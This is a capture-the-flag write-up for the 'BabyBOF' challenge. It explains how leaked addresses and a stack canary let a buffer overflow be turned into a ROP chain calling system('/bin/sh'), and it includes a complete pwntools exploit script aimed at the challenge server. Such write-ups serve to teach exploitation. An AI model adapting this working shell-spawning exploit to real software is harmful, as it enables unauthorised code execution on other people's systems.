BabyBOF Solution
Overview
Target: nc babybof.chal.imaginaryctf.org 1337
Flag: ictf{arent_challenges_written_two_hours_before_ctf_amazing}
This “baby” pwn prints everything you need: addresses for system, a pop rdi; ret gadget, a plain ret gadget, the location of "/bin/sh", and the stack canary. The input is read with an unsafe function, so we can overflow the stack, preserve the canary, and ROP into system("/bin/sh").
________________________________________
Recon
When you connect, the service leaks lines like:
system @ 0x7e68...
pop rdi; ret @ 0x4011ba
ret @ 0x401016
"/bin/sh" @ 0x404038
canary: 0xe444cd86f13ffc00
Give me your input:
From reversing / quick testing:
•	Buffer before canary: 56 bytes
•	Stack layout: 56 bytes buf | 8-byte canary | 8-byte saved RBP | RIP…
•	NX on, but ROP is fine since we’re handed gadgets + libc ptrs.
•	PIE/ASLR irrelevant because addresses are already leaked.
________________________________________
Exploit plan
1.	Keep the canary intact. Overwrite it with the exact leaked value.
2.	Maintain stack alignment. Insert a single ret before pop rdi; ret to keep a 16-byte aligned stack per SysV ABI (some libc calls care).
3.	Call system("/bin/sh").
o	pop rdi; ret → load "/bin/sh" into RDI
o	system address as leaked
Final ROP chain (after canary & saved RBP):
ret
pop rdi ; ret
"/bin/sh"
system
Payload layout:
"A" * 56
+ p64(canary)
+ "B" * 8              # saved RBP filler
+ p64(ret)             # alignment
+ p64(pop_rdi_ret)
+ p64(binsh)
+ p64(system)
________________________________________
Implementation (pwntools)
from pwn import *
import re

HOST, PORT = 'babybof.chal.imaginaryctf.org', 1337
context.arch = 'amd64'
BUF = 56

def parse_leaks(b):
    t = b.decode(errors='ignore')
    sys_   = int(re.search(r'^\s*system\s*@\s*(0x[0-9a-fA-F]+)\s*$', t, re.M).group(1), 16)
    popr  = int(re.search(r'^\s*pop rdi; ret\s*@\s*(0x[0-9a-fA-F]+)\s*$', t, re.M).group(1), 16)
    retg  = int(re.search(r'^\s*ret\s*@\s*(0x[0-9a-fA-F]+)\s*$', t, re.M).group(1), 16)
    binsh = int(re.search(r'^\s*"/bin/sh"\s*@\s*(0x[0-9a-fA-F]+)\s*$', t, re.M).group(1), 16)
    can   = int(re.search(r'^\s*canary:\s*(0x[0-9a-fA-F]+)\s*$', t, re.M).group(1), 16)
    return sys_, popr, retg, binsh, can

io = remote(HOST, PORT)
banner = io.recvuntil(b'input', drop=False)
system, pop_rdi_ret, retg, binsh, canary = parse_leaks(banner)

io.recvuntil(b':')
payload  = b'A'*BUF
payload += p64(canary)
payload += b'B'*8
payload += p64(retg)           # alignment
payload += p64(pop_rdi_ret)
payload += p64(binsh)
payload += p64(system)
io.sendline(payload)

io.sendline(b'cat flag.txt')
print(io.recvline(timeout=2).decode(errors='ignore').strip())
Gotcha that bit me
Make sure your regex for the plain ret line doesn’t accidentally capture the pop rdi; ret line. Anchor each pattern to its line (use ^...$ with re.M). If you mistakenly use pop rdi; ret where a plain ret is expected, your stack alignment breaks and the process exits (EOF).
________________________________________
Result
After sending the payload, we get a shell and read the flag:
ictf{arent_challenges_written_two_hours_before_ctf_amazing}
